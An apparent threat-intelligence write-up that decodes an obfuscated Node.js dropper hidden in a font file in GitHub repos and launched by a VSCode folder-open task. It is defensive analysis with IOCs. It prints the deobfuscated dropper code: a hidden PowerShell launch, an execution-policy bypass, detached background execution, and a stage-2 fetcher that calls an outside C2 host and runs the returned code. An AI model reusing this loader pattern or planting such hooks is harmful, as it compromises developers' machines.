# Task AS: BestCity Cluster — obfuscator.io Payload Decode

**Date:** 2026-07-11  
**Files analyzed:**
- `fullstackragab/bestcity` → `webfonts/fa-brands-regular.woff2` (9,357 bytes) — **available**
- `BestCity-v1/Demo-v1` → `webfonts/fa-brands-regular.woff2` (147,449 bytes) — **404 (repo deleted)**

---

## Summary

The BestCity cluster includes two payload formats: a 55KB WJS IIFE (documented in `ANALYSIS_AC_BESTCITY_CLUSTER.md`) and an obfuscator.io variant embedded in `fa-brands-regular.woff2`. The 147KB obfuscator.io payload from `BestCity-v1/Demo-v1` is gone (repo deleted). This analysis covers the available 9,357B obfuscator.io variant from `fullstackragab/bestcity`.

Key difference from the WJS variant: the C2 delivery uses an **HTTP error response trick** — Stage 2 is returned in the error body of a deliberately failing axios request, not in a successful 200 response. Staging path is `~/Programs_X64/` (vs WJS variant's `/tmp/programx64/`).

C2 (`api-server-mocha.vercel.app`) is **down**: HTTP 451 Unavailable For Legal Reasons as of 2026-07-11 — Vercel abuse takedown.

---

## Trigger

Same `tasks.json` pattern as `BestCity-v1/Demo-v1` and identical to the WJS repos:

```json
{
  "type": "shell",
  "command": "node webfonts/fa-brands-regular.woff2"
}
```

Fires on VSCode `folderOpen` event. The victim is socially engineered to clone the repo and open it in VSCode — the task then executes the woff2 as a Node.js script.

---

## Obfuscation Format

obfuscator.io standard layout:

```
_0x513907 = _0x4c7b          // public accessor
_0x4c7b(n)                   // returns string_array[(n - base) % len], base = 0x192
_0x3f89()                    // returns the raw 53-entry string array
IIFE with push/shift loop    // rotates the array until arithmetic checksum = 0xf3ae7
```

**Rotation: 12 positions.** The checksum IIFE shifts the array until:

```
- parseInt(arr[idx]) / weight + ... == 0xf3ae7
```

is satisfied at rotation=12, meaning every lookup `_0x4c7b(n)` resolves to
`raw_array[(n - 0x192 + 12) % 53]`.

---

## Deobfuscated Logic

### Step 1 — Collect system info

```javascript
const path   = require('path');
const {exec, spawn} = require('child_process');
const fs     = require('fs');
const os     = require('os');

const platform    = process.platform;         // 'win32', 'linux', 'darwin'
const folderName  = 'Programs_X64';           // staging directory name
const destination = os.homedir();             // ~ on Linux/macOS, C:\Users\user on Windows
```

### Step 2 — Build main.js source

The payload constructs `runCode` — a complete, self-contained Node.js script written to disk:

```javascript
const runCode = "const source = '" + __filename.replace(/\\/g, '/') + "';"
              + " const trigger = '" + path.join(path.resolve(__dirname, '..'), '.vscode', 'tasks.json').replaceAll('\\', '/') + "';"
              + " const fs = require('fs');"
              + " const url = 'https://api-server-mocha.vercel.app/api/ipcheck-encrypted/609';"
              + "const axios = require('axios');"
              + "const request = require('request');"
              + "axios.get(url,{headers:{'x-secret-header':'secret'}}).catch(function (err) {"
              +   "const error = err.response.data;"
              +   "const handler = new Function('require', error);"
              +   "handler(require);"
              + "});";
```

`source` = absolute path to the woff2 file that was executed (victim identification).  
`trigger` = absolute path to the `.vscode/tasks.json` that triggered it (repo identification).  
Both paths are embedded in `main.js` written to disk — actor uses them to associate telemetry
with a specific victim's cloned repository.

### Step 3 — Build shell command

```javascript
const runShell = 'cd ' + destination
    + ' && mkdir "' + folderName + '" && cd "' + folderName + '" && echo '
    + (platform == 'win32' ? runCode : '"' + runCode + '"')
    + ' > main.js && '
    + (platform == 'win32'
        ? 'powershell -Command "Start-Process powershell -ArgumentList \'-Command\', \'npm init -y; npm install axios request; node main.js\' -WindowStyle Hidden"'
        : 'cd ' + path.join(destination, folderName) + ' && npm init -y && npm install axios request');
```

Shell creates `~/Programs_X64/`, writes `main.js`, then installs deps and (Windows) runs hidden.

### Step 4 — Platform-specific execution

#### Windows path

```javascript
// 1. Check execution policy
exec('powershell -Command "Get-ExecutionPolicy -Scope CurrentUser"', (err, stdout, stderr) => {
    if (stdout.trim() === 'Restricted' || stdout.trim() === 'Undefined') {
        exec('powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force"');
    }
});

// 2. One second later, run the shell (echo main.js + Start-Process hidden)
setTimeout(() => {
    exec(runShell, {shell: true});
}, 1000);
```

The `Start-Process powershell -WindowStyle Hidden` runs `npm init -y; npm install axios request; node main.js` in a hidden PowerShell window — process is invisible to the user.

#### Linux / macOS path

```javascript
exec(runShell, {shell: true}, (err, stdout, stderr) => {
    // Shell has finished npm install; now spawn node detached
    const child = spawn('node', ['main.js'], {
        cwd: path.join(destination, folderName),
        detached: true,
        stdio: 'ignore'
    });
    child.unref();
});
```

`unref()` decouples the child from the parent; Node.js exits normally while `main.js` runs in background.

### Step 5 — Stage 2 delivery (main.js)

The written `main.js` fetches Stage 2 via an **intentional error-response trick**:

```javascript
const url = 'https://api-server-mocha.vercel.app/api/ipcheck-encrypted/609';
axios.get(url, {headers: {'x-secret-header': 'secret'}})
    .catch(function (err) {
        const error = err.response.data;         // Stage 2 payload in error body
        const handler = new Function('require', error);
        handler(require);
    });
```

The C2 **deliberately returns a 4xx/5xx HTTP error** containing the Stage 2 payload in the
response body. The `.catch()` handler (not `.then()`) executes the payload. This is OPSEC:

- Security proxies that only inspect successful (2xx) HTTP responses miss the payload
- The C2 endpoint path `/api/ipcheck-encrypted/609` looks like a legitimate IP-check API
- The path parameter `609` is likely a campaign/victim-group ID
- `x-secret-header: secret` gates the response — requests without this header would return
  a benign error with no payload

Stage 2 is passed to `new Function('require', error)` and called with `require` — giving it
full Node.js module access. This is functionally identical to `eval(stage2_text)`.

---

## Comparison: obfuscator.io vs WJS Variant

| Attribute | WJS variant (55KB) | obfuscator.io variant (9KB) |
|-----------|--------------------|-----------------------------|
| Repos | `technoknol`, `AbstractFruitFactory` | `fullstackragab`, `BestCity-v1` |
| Font filename | `fa-solid-400.woff2` | `fa-brands-regular.woff2` |
| Staging dir | `/tmp/programx64/` | `~/Programs_X64/` |
| C2 | `jsonkeeper.com/b/85QGH` (404) | `api-server-mocha.vercel.app/api/ipcheck-encrypted/609` (451) |
| C2 protocol | `axios.get()` → `res.data.model` on 200 | `axios.get()` → `err.response.data` on error |
| Auth | None | `x-secret-header: secret` |
| npm packages | `axios`, `request` | `axios`, `request` |
| Process evasion | `process.title = 'Node.js JavaScript Runtime'` | None documented |
| Windows execution | Not documented in AC | PowerShell execution policy check + hidden Start-Process |
| Linux/macOS | `execSync` | `exec()` → callback → `spawn().unref()` |
| Stage 2 execution | `new (Function.constructor)(...)` | `new Function('require', error)` |
| Paths recorded | No | Yes — `source` + `trigger` paths in main.js |
| Tasks.json trigger | `node ./public/fontawesome/fa-solid-400.woff2` | `node webfonts/fa-brands-regular.woff2` |

The obfuscator.io variant is more operationally mature: it records victim paths, uses an
auth header on the C2, uses the error-response trick for evasion, and has full Windows
execution policy bypass. The actor likely deployed the WJS variant first, then iterated to
the obfuscator.io variant with these improvements.

---

## Anti-debugging (obfuscator.io standard)

The payload installs console method overrides on startup:

```javascript
// Replaces console.log, .warn, .info, .table, .trace, .exception, .error
// with toString-overridden versions that prevent debugger inspection
// Uses __proto__ manipulation to persist across Node.js inspector reattach
```

This is stock obfuscator.io protection; no custom anti-debugging observed.

---

## C2 Status

| Endpoint | Status | Date | Notes |
|----------|--------|------|-------|
| `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/609` | **451 Unavailable For Legal Reasons** | 2026-07-11 | Vercel abuse/legal takedown |
| `https://www.jsonkeeper.com/b/85QGH` (WJS variant) | 404 (dead) | 2026-06-29 | Documented in AC |
| `BestCity-v1/Demo-v1` repo | **404 (deleted)** | 2026-07-11 | 147KB obfuscator.io payload gone |

Both BestCity C2 endpoints are now down. The 147KB variant's source repo was also deleted.
The cluster appears to be **fully decommissioned** as of 2026-07-11.

---

## IOCs

| Type | Value | Notes |
|------|-------|-------|
| C2 URL | `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/609` | Stage 2 delivery; **451 as of 2026-07-11** |
| C2 domain | `api-server-mocha.vercel.app` | Vercel-hosted; "mocha" mimics CI/test tooling |
| Auth header | `x-secret-header: secret` | Gates Stage 2 response |
| Staging dir | `~/Programs_X64/` | Dropper written here |
| Written file | `~/Programs_X64/main.js` | Stage 2 fetcher written to disk |
| npm packages | `axios`, `request` | Installed silently during staging |
| Obfuscation | obfuscator.io rotation=12, base=0x192, 53-entry array | |
| Deleted repo | `BestCity-v1/Demo-v1` | 147KB variant; 404 as of 2026-07-11 |
| C2 path param | `/609` | Likely campaign/victim-group ID |
| Execution policy bypass | `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force` | Windows only; fires if policy is Restricted or Undefined |

---

## Update Required: ANALYSIS_AC_BESTCITY_CLUSTER.md

The AC document should be updated to add the obfuscator.io C2 URL to the IOC table and
note the Vercel takedown. The WJS C2 comparison table entry for the obfuscator.io variant
was documented as "(see AS)" — that analysis is now here.

---

## Related Documents

- `ANALYSIS_AC_BESTCITY_CLUSTER.md` — full cluster overview, WJS 55KB variant decode
- `ANALYSIS_AD_JSONWEBAUTH.md` — jsonkeeper.com C2 dead-drop analysis
